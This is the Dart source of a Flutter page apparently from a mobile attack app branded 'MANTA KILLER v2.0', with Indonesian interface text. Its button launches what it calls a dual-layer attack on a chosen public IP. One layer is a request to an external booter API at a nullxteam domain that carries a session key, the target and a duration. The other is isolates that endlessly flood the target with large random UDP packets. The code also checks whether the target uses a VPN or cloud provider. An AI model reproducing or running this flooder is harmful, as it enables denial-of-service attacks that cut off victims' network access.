import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:isolate';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:ui';

class WifiExternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiExternalPage({super.key, required this.sessionKey});

  @override
  State<WifiExternalPage> createState() => _WifiExternalPageState();
}

class _WifiExternalPageState extends State<WifiExternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  List<Isolate> _isolates = [];


  static const Color bgDark = Color(0xFF090D14);
  static const Color surfaceSolid = Color(0xFF111827);
  static const Color surfaceCard = Color(0xFF1A2438);
  static const Color borderSoft = Color(0xFF212B3D);
  static const Color accentCyan = Color(0xFF0EA5E9);
  static const Color accentIndigo = Color(0xFF6366F1);
  static const Color textMain = Color(0xFFE2E8F0);
  static const Color textMuted = Color(0xFF94A3B8);
  static const Color bloodRed = Color(0xFFEF4444);

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(
        Uri.parse("https://api.ipify.org?format=json"),
      );
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(
        Uri.parse(
          "http://ip-api.com/json/$ip?fields=as,regionName,status,query",
        ),
      );
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String? ?? "").toLowerCase();
      final isBlockedAsn =
          asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }


  Future<void> _startAttack() async {
    if (publicIp == "-" || publicIp == "Error") {
      _showAlert("❌ Error", "Target IP tidak valid.");
      return;
    }

    setState(() => isAttacking = true);


    final url = Uri.parse(
      "https://evo.nullxteam.fun/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120",
    );

    try {
      http.get(url); // Fire and forget for API


      int threads = Platform.numberOfProcessors;
      if (threads > 4) threads = 4;

      for (int i = 0; i < threads; i++) {
        final isolate = await Isolate.spawn(_floodIsolate, {
          'ip': publicIp,
          'port': 80, // HTTP port for external targeting
        });
        _isolates.add(isolate);
      }

      _showSnackBar("🚀 DUAL-LAYER ATTACK INITIALIZED");
    } catch (e) {
      _showSnackBar("⚠️ API Layer Failed, Local Flood Active");
    }
  }

  static void _floodIsolate(Map<String, dynamic> data) async {
    final String targetIp = data['ip'];
    final int port = data['port'];
    final Random random = Random();
    final List<int> payload = List<int>.generate(
      65000,
      (_) => random.nextInt(256),
    );
    final destination = InternetAddress(targetIp);

    while (true) {
      try {
        final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
        for (int i = 0; i < 40; i++) {
          socket.send(payload, destination, port);
        }
        socket.close();
      } catch (_) {
        await Future.delayed(const Duration(milliseconds: 2));
      }
    }
  }

  void _stopAttack() {
    setState(() => isAttacking = false);
    for (var isolate in _isolates) {
      isolate.kill(priority: Isolate.immediate);
    }
    _isolates.clear();
    _showSnackBar("🛑 Protocol Terminated");
  }

  void _showSnackBar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          message,
          style: const TextStyle(fontWeight: FontWeight.bold),
        ),
        backgroundColor: accentIndigo,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: AlertDialog(
          backgroundColor: surfaceCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: const BorderSide(color: borderSoft),
          ),
          title: Text(
            title,
            style: const TextStyle(
              color: accentCyan,
              fontWeight: FontWeight.bold,
            ),
          ),
          content: Text(message, style: const TextStyle(color: textMuted)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text(
                "OK",
                style: TextStyle(
                  color: accentCyan,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGlassCard({required Widget child, EdgeInsetsGeometry? padding}) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: padding ?? const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: surfaceCard.withOpacity(0.8),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderSoft),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 20,
            offset: const Offset(0, 10),
          ),
        ],
      ),
      child: child,
    );
  }

  Widget _buildInfoRow(String label, String value, IconData icon) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
      decoration: BoxDecoration(
        color: bgDark.withOpacity(0.5),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: borderSoft.withOpacity(0.5)),
      ),
      child: Row(
        children: [
          Icon(icon, color: accentCyan, size: 16),
          const SizedBox(width: 12),
          Text(
            label,
            style: const TextStyle(
              color: textMuted,
              fontSize: 13,
              fontWeight: FontWeight.w600,
            ),
          ),
          const Spacer(),
          Text(
            value,
            style: const TextStyle(
              color: textMain,
              fontSize: 14,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopAttack();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: Stack(
        children: [
          Positioned.fill(
            child: CustomPaint(painter: _GeometricBackgroundPainter()),
          ),

          SafeArea(
            child: isLoading
                ? const Center(
                    child: CircularProgressIndicator(color: accentCyan),
                  )
                : SingleChildScrollView(
                    padding: const EdgeInsets.all(24),
                    physics: const BouncingScrollPhysics(),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [

                        _buildGlassCard(
                          padding: const EdgeInsets.symmetric(
                            vertical: 20,
                            horizontal: 24,
                          ),
                          child: Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(10),
                                decoration: BoxDecoration(
                                  color: accentCyan.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                child: Icon(
                                  Icons.public_rounded,
                                  color: isAttacking ? bloodRed : accentCyan,
                                  size: 28,
                                ),
                              ),
                              const SizedBox(width: 16),
                              Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const Text(
                                    "EXTERNAL KILLER",
                                    style: TextStyle(
                                      fontSize: 20,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 2,
                                      color: textMain,
                                    ),
                                  ),
                                  Text(
                                    "MANTA KILLER v2.0",
                                    style: TextStyle(
                                      fontSize: 10,
                                      fontWeight: FontWeight.bold,
                                      letterSpacing: 1.5,
                                      color: isAttacking
                                          ? bloodRed
                                          : accentCyan,
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),

                        const SizedBox(height: 24),


                        _buildGlassCard(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text(
                                "TARGET REMOTE DATA",
                                style: TextStyle(
                                  color: accentCyan,
                                  fontSize: 11,
                                  fontWeight: FontWeight.w900,
                                  letterSpacing: 1.5,
                                ),
                              ),
                              const SizedBox(height: 16),
                              _buildInfoRow(
                                "Public IP",
                                publicIp,
                                Icons.language_rounded,
                              ),
                              _buildInfoRow(
                                "Region",
                                region,
                                Icons.map_rounded,
                              ),
                              _buildInfoRow(
                                "Provider",
                                asn,
                                Icons.business_rounded,
                              ),
                            ],
                          ),
                        ),

                        const SizedBox(height: 24),

                        if (isVpn)
                          _buildGlassCard(
                            child: Row(
                              children: [
                                const Icon(
                                  Icons.security_rounded,
                                  color: Color(0xFFFBBF24),
                                  size: 24,
                                ),
                                const SizedBox(width: 16),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    children: [
                                      const Text(
                                        "VPN DETECTED",
                                        style: TextStyle(
                                          color: Color(0xFFFBBF24),
                                          fontWeight: FontWeight.w900,
                                          fontSize: 12,
                                        ),
                                      ),
                                      const SizedBox(height: 4),
                                      Text(
                                        "Target menggunakan VPN/Proxy. Serangan mungkin kurang efektif.",
                                        style: TextStyle(
                                          color: textMuted,
                                          fontSize: 11,
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                              ],
                            ),
                          ),

                        const SizedBox(height: 32),


                        GestureDetector(
                          onTap: isAttacking ? _stopAttack : _startAttack,
                          child: AnimatedContainer(
                            duration: const Duration(milliseconds: 300),
                            width: double.infinity,
                            height: 64,
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(16),
                              gradient: LinearGradient(
                                colors: isAttacking
                                    ? [bloodRed, const Color(0xFF991B1B)]
                                    : [accentCyan, accentIndigo],
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: (isAttacking ? bloodRed : accentCyan)
                                      .withOpacity(0.3),
                                  blurRadius: 20,
                                  offset: const Offset(0, 8),
                                ),
                              ],
                            ),
                            child: Center(
                              child: Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Icon(
                                    isAttacking
                                        ? Icons.stop_rounded
                                        : Icons.wifi_off_rounded,
                                    color: Colors.white,
                                  ),
                                  const SizedBox(width: 12),
                                  Text(
                                    isAttacking
                                        ? "HENTIKAN SERANGAN"
                                        : "SERANG TARGET",
                                    style: const TextStyle(
                                      color: Colors.white,
                                      fontWeight: FontWeight.w900,
                                      fontSize: 16,
                                      letterSpacing: 2,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ),

                        if (isAttacking) ...[
                          const SizedBox(height: 32),
                          Center(
                            child: Column(
                              children: [
                                const SizedBox(
                                  width: 40,
                                  height: 40,
                                  child: CircularProgressIndicator(
                                    color: bloodRed,
                                    strokeWidth: 4,
                                  ),
                                ),
                                const SizedBox(height: 16),
                                TweenAnimationBuilder<double>(
                                  tween: Tween(begin: 0.0, end: 1.0),
                                  duration: const Duration(seconds: 1),
                                  builder: (context, value, child) => Opacity(
                                    opacity:
                                        0.5 +
                                        (sin(
                                                  DateTime.now()
                                                          .millisecondsSinceEpoch /
                                                      200,
                                                ) *
                                                0.5)
                                            .abs(),
                                    child: const Text(
                                      "DUAL-LAYER ATTACK IN PROGRESS...",
                                      style: TextStyle(
                                        color: bloodRed,
                                        fontWeight: FontWeight.w900,
                                        fontSize: 12,
                                        letterSpacing: 1,
                                      ),
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],

                        const SizedBox(height: 50),
                      ],
                    ),
                  ),
          ),
        ],
      ),
    );
  }
}

class _GeometricBackgroundPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paintLine = Paint()
      ..color = const Color(0xFF1E2B4B).withOpacity(0.3)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1.0;

    final paintFill = Paint()
      ..color = const Color(0xFF0EA5E9).withOpacity(0.015)
      ..style = PaintingStyle.fill;

    void drawTriangle(Offset p1, Offset p2, Offset p3) {
      final path = Path()
        ..moveTo(p1.dx, p1.dy)
        ..lineTo(p2.dx, p2.dy)
        ..lineTo(p3.dx, p3.dy)
        ..close();
      canvas.drawPath(path, paintFill);
      canvas.drawPath(path, paintLine);
    }

    drawTriangle(
      Offset(size.width * 0.9, size.height * 0.1),
      Offset(size.width * 1.3, size.height * 0.5),
      Offset(size.width * 0.7, size.height * 0.4),
    );
    drawTriangle(
      Offset(-size.width * 0.1, size.height * 0.2),
      Offset(size.width * 0.3, size.height * 0.5),
      Offset(-size.width * 0.2, size.height * 0.7),
    );
    drawTriangle(
      Offset(size.width * 0.4, size.height * 0.8),
      Offset(size.width * 0.8, size.height * 1.1),
      Offset(size.width * 0.2, size.height * 1.0),
    );

    final dotPaint = Paint()
      ..color = const Color(0xFF0EA5E9).withOpacity(0.2)
      ..style = PaintingStyle.fill;
    final points = [
      Offset(size.width * 0.9, size.height * 0.1),
      Offset(size.width * 0.7, size.height * 0.4),
      Offset(size.width * 0.3, size.height * 0.5),
      Offset(size.width * 0.4, size.height * 0.8),
    ];
    for (var point in points) {
      canvas.drawCircle(point, 3.0, dotPaint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}
